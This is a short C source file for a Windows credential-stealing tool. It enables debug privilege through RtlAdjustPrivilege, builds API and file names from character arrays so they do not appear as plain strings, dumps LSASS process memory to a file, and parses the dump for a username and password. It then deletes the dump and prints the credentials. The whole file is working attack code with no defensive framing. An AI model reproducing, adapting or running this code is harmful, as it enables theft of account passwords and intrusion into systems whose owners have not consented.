#include "pw.h"
#include "dump.h"
BOOL parse(wchar_t * path)
{
    if (!NT_SUCCESS(my_m_modules_reset(path)))
    {
        return FALSE;
    }
    if (!NT_SUCCESS(my_m_modules_get()))
    {
        return FALSE;
    }
    return TRUE;
} 
int wmain(int argc, wchar_t* argv[])
{
    HANDLE hStdout = 0;
    BOOL bSuccess = FALSE;
    ULONG t = 0;
    DWORD dwWritten = 0;
    wchar_t chBuf[BUFERSIZE] = { 0 };
    char szntdll[] = { 'n','t','d','l','l','.','d','l','l','\0' };
    char szRtlAdjustPrivilege[] = { 'R','t','l','A','d','j','u','s','t','P','r','i','v','i','l','e','g','e','\0' };
    wchar_t wszfork[] = { L'f',L'o',L'r',L'k',L'.',L'd',L'm',L'p',L'\0' };
    wchar_t szFormat[] = { L'n',L'a',L'm',L'e',L':',L'%',L'w',L's',L',',L'p',L'w',L':',L'%',L'w',L's',L'\0' };
    //redirection pipe
    hStdout = GetStdHandle(STD_OUTPUT_HANDLE);
    if (hStdout == INVALID_HANDLE_VALUE)
    {
        return errInvalidHandle;
    }
    //privilege escalation 
    _RtlAdjustPrivilege MRtlAdjustPrivilege = (_RtlAdjustPrivilege)GetProcAddress(
        GetModuleHandleA(szntdll), szRtlAdjustPrivilege);
    if (MRtlAdjustPrivilege == NULL)
    {
        return errGetProcAddr;

    }
    MRtlAdjustPrivilege(20, TRUE, FALSE, &t);
    //dump LSASS
    if (FALSE == dumpLsa(wszfork))
    {
        return errDumpProc;
    }
    //parse lsass
    if (FALSE == parse(wszfork))
    {
        return errParseDMP;
    }
    //delete dumped file
    DeleteFileW(wszfork);
    //write data
    wsprintfW(chBuf, szFormat, wUserName2, wPw);
    bSuccess = WriteFile(hStdout, chBuf, BUFERSIZE, &dwWritten, NULL);
    if (!bSuccess)
    {
        return errWritePipe;
    }
    return 0;
}
